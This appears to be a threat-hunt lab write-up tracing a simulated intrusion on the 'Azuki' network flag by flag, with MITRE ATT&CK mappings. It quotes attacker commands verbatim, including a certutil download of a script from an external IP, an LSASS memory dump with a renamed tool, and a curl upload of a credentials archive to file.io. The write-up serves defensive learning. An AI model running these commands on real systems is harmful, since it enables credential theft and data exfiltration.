<p align="center">
  <img
    src="https://github.com/user-attachments/assets/91a89840-4446-4ad4-a020-94d57c079f47"
    alt="image"
    width="518"
    height="777"
  />
</p>

# Threat Hunt - Azuki Import/Export
### Microsoft Defender for Endpoint | Nov 21, 2025

---

## Situation

This documents a full post-compromise intrusion on the Azuki network. The attacker returned approximately 72 hours after initial access, moved laterally to the file server using stolen credentials, conducted reconnaissance, staged and compressed sensitive data, dumped credentials from memory, exfiltrated to a public file sharing service, established persistence, and deleted forensic artifacts.

---

## Hunt Overview

| Flag | Technique Category              | MITRE ID      | Priority |
|------|---------------------------------|---------------|----------|
| 1    | Initial Access (Return)         | T1078         | Critical |
| 2    | Lateral Movement (RDP)          | T1021.001     | Critical |
| 3    | Valid Account Abuse             | T1078         | Critical |
| 4    | Share Discovery                 | T1135         | High     |
| 5    | Remote Share Discovery          | T1135         | High     |
| 6    | Privilege Discovery             | T1033 / T1069 | High     |
| 7    | Network Discovery               | T1016         | Medium   |
| 8    | Defense Evasion (Hidden Files)  | T1564.001     | High     |
| 9    | Data Staging                    | T1074.001     | Critical |
| 10   | LOLBIN Download                 | T1105         | Critical |
| 11   | Credential Discovery            | T1552.001     | Critical |
| 12   | Bulk Data Collection            | T1074.001     | Critical |
| 13   | Data Compression                | T1560.001     | High     |
| 14   | Tool Masquerading               | T1036         | High     |
| 15   | LSASS Memory Dump               | T1003.001     | Critical |
| 16   | Data Exfiltration (HTTP)        | T1048.003     | Critical |
| 17   | Cloud Exfiltration              | T1567.002     | Critical |
| 18   | Persistence (Registry Run Key)  | T1547.001     | High     |
| 19   | Persistence (Masqueraded Beacon)| T1036.005     | High     |
| 20   | Anti-Forensics (History Deletion)| T1070.003    | High     |

---

<a id="flag-1"></a>
## Flag 1 — Initial Access Return

**Finding:** `159.26.106.98`

The IP identified here is the address the attacker used when coming back roughly 72 hours after first breaking in. Skilled attackers will commonly switch up their infrastructure between sessions to avoid being flagged by detections tied to a previously seen IP. Finding this new return address confirms the attacker kept their foothold, was patient, and is now pushing the intrusion further (MITRE ATT&CK TA0001 – Initial Access maintained through T1078 – Valid Accounts).

<img width="2414" height="804" alt="Screenshot - 1" src="https://github.com/user-attachments/assets/1aa67120-2169-4bb9-b5ea-356ad8feb435" />


---

<a id="flag-2"></a>
## Flag 2 — Lateral Movement Device

**Finding:** `azuki-fileserver01`

The command `mstsc.exe /v:10.1.0.188` shows someone using Remote Desktop to connect to the machine at that IP. In a compromised environment this is a clear sign the attacker is leveraging stolen credentials to jump from a machine they already control to another target on the internal network via RDP. This event identifies where the attacker moved next and confirms active hands-on-keyboard movement — a critical escalation in most real breaches (MITRE ATT&CK T1021.001 – Remote Desktop Protocol).


<img width="2394" height="775" alt="Screenshot 2" src="https://github.com/user-attachments/assets/f2e5e7b1-0ae8-4d98-aeda-95f9cf1b8d96" />

---

<a id="flag-3"></a>
## Flag 3 — Compromised Account

**Finding:** `fileadmin`

Pinpointing the exact account that was compromised is essential because it reveals the full scope of what the attacker can access — in this case the files and shares that a file server admin would have rights to. Knowing which account was abused allows for immediate containment actions like disabling or resetting it, and directs the rest of the investigation toward what that account could reach (MITRE ATT&CK T1078 – Valid Accounts used for lateral movement and data access).

<img width="2410" height="644" alt="Screenshot 3 flag3" src="https://github.com/user-attachments/assets/0670b815-445e-40b7-a086-6d1d9cd1798b" />


---

<a id="flag-4"></a>
## Flag 4 — Share Discovery

**Finding:** `"net.exe" share`

The attacker ran a command to list every network share visible from the compromised machine. This one simple action immediately shows them which servers and workstations are sharing folders and more importantly which ones their stolen account can actually reach. Catching this early tells us the attacker is actively mapping the network for high value data locations — shares often hold the most sensitive data like finance, HR, backups, and databases and become the primary exfiltration targets (MITRE ATT&CK T1135 – Network Share Discovery)

<img width="1493" height="799" alt="Screenshot 4 flag 4" src="https://github.com/user-attachments/assets/737cf8be-f22e-48d9-98a5-232535350756" />


---

<a id="flag-5"></a>
## Flag 5 — Remote Share Discovery

**Finding:** `"net.exe" view \\10.1.0.188`

Rather than just checking local shares, the attacker queried shares on a remote machine, revealing which folders and files on other servers are accessible with their current stolen credentials. This step matters because it helps the attacker rapidly find high value data repositories across the network — file servers holding finance, HR, or customer records — which become the ultimate targets for collection or encryption. Detecting remote share enumeration signals the attacker has moved past basic recon and is actively hunting for data (MITRE ATT&CK T1135 – Network Share Discovery).

<img width="1690" height="926" alt="Screenshot 5 flag5" src="https://github.com/user-attachments/assets/b1a3f1ff-0b3a-4e06-8ba6-17be8680b4bc" />


---

<a id="flag-6"></a>
## Flag 6 — Privilege Discovery

**Finding:** `"whoami.exe" /all`

Running `whoami /all` gives the attacker a full picture of their effective privileges, group memberships, token elevation status, and assigned rights under the current session. This lets them immediately determine whether they already have admin or delegated access or whether they need to escalate before moving on. This command appearing via PowerShell is a strong indicator of interactive attacker presence rather than automated background activity, and aligns with MITRE ATT&CK T1033 – System Owner/User Discovery and T1069 – Permission Group Discovery.

<img width="1688" height="926" alt="Screenshot 6 flag 6" src="https://github.com/user-attachments/assets/ae05ba31-47c1-41c5-9f0f-8f18d0fa8010" />


---

<a id="flag-7"></a>
## Flag 7 — Network Discovery

**Finding:** `"ipconfig.exe" /all`

Running `ipconfig /all` gives the attacker detailed information about the host's network setup including IP addresses, DNS servers, default gateways, and domain membership. This helps them figure out if the system is domain-joined, identify internal DNS infrastructure, and find additional network segments they might be able to reach. This command is commonly run right after gaining access to orient the attacker in the environment and maps to MITRE ATT&CK T1016 – System Network Configuration Discovery.

<img width="1810" height="845" alt="Screenshot 7 flag 7" src="https://github.com/user-attachments/assets/30eaf2fd-5094-4d1d-9312-abe84c240348" />


---

<a id="flag-8"></a>
## Flag 8 — Directory Hiding

**Finding:** `"attrib.exe" +h +s C:\Windows\Logs\CBS`

Applying hidden and system attributes to a directory is a common way attackers conceal their tools and staged data from users, administrators, and basic file browsing. Tucking the directory under a trusted Windows path like `C:\Windows\Logs\CBS` makes it blend in with legitimate system files that are rarely looked at closely. This maps to MITRE ATT&CK T1564.001 – Hide Artifacts: Hidden Files and Directories, and when seen alongside other attacker activity it typically signals post-compromise cleanup or preparation for longer term access.

<img width="1688" height="812" alt="Screenshot 8 flag 8" src="https://github.com/user-attachments/assets/b33d315b-99ed-4aea-9764-b37312bb1d2c" />


---

<a id="flag-9"></a>
## Flag 9 — Staging Directory

**Finding:** `C:\Windows\Logs\CBS`

Attackers create staging directories to gather their tools, scripts, and collected data in one place before exfiltrating, which keeps things efficient and reduces detection noise. Using a trusted Windows path like `C:\Windows\Logs\CBS` makes the directory blend in and avoid casual inspection. The fact that this directory was also hidden with attribute manipulation reinforces that this is intentional concealment rather than any kind of normal admin activity. This maps to MITRE ATT&CK T1074.001 – Data Staged: Local Data Staging.

<img width="1688" height="812" alt="Screenshot 8 flag 8" src="https://github.com/user-attachments/assets/a18db4ce-392c-4d67-834a-40a6c59bb210" />


---

<a id="flag-10"></a>
## Flag 10 — LOLBIN Download

**Finding:** `"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1`

`certutil.exe` is a legitimate signed Windows binary that also happens to support downloading files — making it a go-to living off the land tool for attackers who want to pull down payloads without triggering application whitelisting. Here it was used to download a PowerShell script from an attacker-controlled server straight into the hidden staging directory. The use of a non-standard high port adds another layer of evasion. This maps to MITRE ATT&CK T1105 – Ingress Tool Transfer.

<img width="1745" height="797" alt="Screenshot 10 flag 10" src="https://github.com/user-attachments/assets/ea2450da-3b81-454c-ba04-2cb4d37789a8" />


---

<a id="flag-11"></a>
## Flag 11 — Credential File

**Finding:** `IT-Admin-Passwords.csv`

Credential files like CSVs or spreadsheets containing admin passwords are among the most valuable things an attacker can find during an intrusion. Copying an entire IT admin directory into a hidden staging location makes it clear the attacker is collecting credentials for later use, exfiltration, or offline cracking. Valid admin credentials make lateral movement, privilege escalation, and even full domain compromise possible without any noisy exploitation. This maps to MITRE ATT&CK T1552.001 – Unsecured Credentials: Credentials in Files.

<img width="1737" height="853" alt="Screenshot 11 flag 11" src="https://github.com/user-attachments/assets/58faef48-38b4-4045-a3a6-c1aa186c3e5a" />


---

<a id="flag-12"></a>
## Flag 12 — Bulk Copy Command

**Finding:** `"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`

This confirms deliberate and systematic data collection rather than someone just browsing files. The attacker used `xcopy.exe` repeatedly to copy multiple high value file shares — Contracts, Financial, IT-Admin, Shipping — into a single hidden staging directory, which strongly points to preparation for exfiltration or encryption. The consistent tooling, destination path, and command line switches are all consistent with hands-on-keyboard human operated intrusion behavior. This maps to MITRE ATT&CK T1074.001 – Data Staged: Local Data Staging.

<img width="1379" height="736" alt="Screenshot 12 flag 12" src="https://github.com/user-attachments/assets/aa8f63db-9c96-4fa2-97a1-4834890458d5" />


---

<a id="flag-13"></a>
## Flag 13 — Data Compression

**Finding:** `"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`

`tar.exe` being used on a Windows system is not something you see in normal admin work — it's a deliberate attacker choice. Compressing staged data reduces the size, preserves the directory structure, and gets everything ready for fast exfiltration. The archive here targets a hidden staging directory already containing harvested credential material, confirming this is a late stage collection step. Compression is a clear signal the operation is moving from collection into exfiltration readiness and maps to MITRE ATT&CK T1560.001 – Archive Collected Data: Archive via Utility.

<img width="1955" height="829" alt="Screenshot 13 flag 13" src="https://github.com/user-attachments/assets/d1006884-5242-45e8-83ec-72c9e6baa45a" />


---

<a id="flag-14"></a>
## Flag 14 — Renamed Tool

**Finding:** `pd.exe`

Renaming tools is a basic but effective way to get around detections that look for known filenames like `mimikatz.exe`. An unfamiliar executable showing up in a staging directory shortly before credential dumping activity is a strong indicator of a renamed or repacked tool. Attackers do this to blend in and slow down the defender response. Combined with everything else seen in this intrusion, this maps to MITRE ATT&CK T1003 – OS Credential Dumping with evasion via T1036 – Masquerading.

<img width="1655" height="735" alt="Screenshot 14 flag 14" src="https://github.com/user-attachments/assets/de722564-01d2-4f97-857b-5ed2a0aae603" />


---

<a id="flag-15"></a>
## Flag 15 — LSASS Memory Dump

**Finding:** `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp`

Dumping LSASS memory is one of the most reliable signals of credential theft on Windows. LSASS stores sensitive authentication material including plaintext credentials, NTLM hashes, and Kerberos tickets for all logged on users. The attacker used a renamed tool with explicit memory dump arguments targeting the LSASS process, and wrote the output to a disguised path — both of which show deliberate intent and operational awareness. This maps to MITRE ATT&CK T1003.001 – OS Credential Dumping: LSASS Memory and should be treated as a containment critical event.

<img width="1654" height="659" alt="Screenshot 15 flag 15" src="https://github.com/user-attachments/assets/faccebde-3852-4317-b19d-53daf1e19c81" />


---

<a id="flag-16"></a>
## Flag 16 — Exfiltration Command

**Finding:** `"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io`

Using `curl.exe` to upload an archive to an external file sharing service is active exfiltration, not just staging. Command line HTTP tools let attackers automate transfers, sidestep browser-based controls, and operate quietly through built-in Windows binaries. The destination `file.io` is a legitimate public service which makes the traffic blend into normal outbound HTTPS. At this point sensitive data has already left the environment. This maps to MITRE ATT&CK T1048.003 – Exfiltration Over Alternative Protocol.

<img width="1707" height="883" alt="Screenshot 16 flag 16" src="https://github.com/user-attachments/assets/e6bb5fa7-f74a-4cf6-9035-404a662e7be0" />


---

<a id="flag-17"></a>
## Flag 17 — Cloud Exfiltration

**Finding:** `file.io`

Sending data to a public cloud file sharing platform is a high risk scenario because these services are trusted, encrypted, and usually allowed through perimeter controls. Attackers prefer services like `file.io` because the traffic looks identical to normal HTTPS activity without endpoint context. In this case a full LSASS memory dump was uploaded — meaning credentials have not just been accessed but physically removed from the environment, making containment alone insufficient. This maps to MITRE ATT&CK T1567.002 – Exfiltration Over Web Service: Exfiltration to Cloud Storage.

<img width="1718" height="829" alt="Screenshot 17 flag 17" src="https://github.com/user-attachments/assets/e3fab80f-5758-4c1a-add4-99723ea41a72" />


---

<a id="flag-18"></a>
## Flag 18 — Registry Persistence

**Finding:** `FileShareSync`

Registry Run keys are one of the most dependable low-noise persistence methods available because they fire on every startup or user logon without fail. Naming the value `FileShareSync` was a deliberate choice to look like normal enterprise software and reduce the chance of someone noticing it during a review. The payload launches a hidden PowerShell process pointing to a script in a nonstandard path, indicating the attacker wants continued access rather than a one-time hit. This maps to MITRE ATT&CK T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys.

<img width="2059" height="1018" alt="Screenshot 18 flag 18" src="https://github.com/user-attachments/assets/9d125b30-0e18-4b25-9d50-9ff359878cc0" />


---

<a id="flag-19"></a>
## Flag 19 — Beacon Filename

**Finding:** `svchost.ps1`

Naming the payload `svchost.ps1` directly abuses the trust people place in the well-known `svchost.exe` Windows process, making it far more likely the file gets overlooked during triage. Dropping it into `C:\Windows\System32` reinforces the disguise since files there are generally assumed to be legitimate and system managed. Combined with the registry Run key this gives the attacker stealthy long term persistence with minimal noise. This maps to MITRE ATT&CK T1036.005 – Masquerading: Match Legitimate Name or Location.

<img width="2059" height="1018" alt="Screenshot 18 flag 18" src="https://github.com/user-attachments/assets/43610257-8d0e-44b5-b837-5ba5f92351af" />


---

<a id="flag-20"></a>
## Flag 20 — History File Deletion

**Finding:** `ConsoleHost_history.txt`

PowerShell keeps a persistent command history file specifically so sessions can be reconstructed after the fact for forensic purposes. Deleting it is a deliberate anti-forensics move meant to wipe evidence of what commands were run, what tools were used, and what the attacker's intent was. This kind of cleanup is rarely done during normal admin work and almost always happens after the main objectives are complete — credential access, persistence, lateral movement — when the attacker is trying to slow down incident response. This maps to MITRE ATT&CK T1070.003 – Indicator Removal on Host: Clear Command History.

<img width="2310" height="866" alt="Screenshot 20 flag 20" src="https://github.com/user-attachments/assets/eff220f8-c4df-49b8-8228-6a268f464a9c" />

## Summary
This intrusion represents a full-spectrum post-compromise attack leveraging valid credentials to re-enter the environment, move laterally via RDP, and systematically enumerate the network and host. The attacker demonstrated strong operational discipline by staging data in nonstandard system directories, abusing living-off-the-land binaries (LOLBins), and carefully sequencing actions to avoid early detection.

Credential access via LSASS memory dumping marked a decisive escalation, followed by deliberate compression and exfiltration of sensitive data using both direct HTTP transfer and cloud-based file hosting to blend with legitimate traffic. Persistence was established through registry autorun keys using masqueraded filenames, and the operation concluded with targeted anti-forensic actions to remove PowerShell execution history. Overall, the activity reflects a capable adversary executing a methodical, goal-oriented campaign rather than opportunistic or automated malware.

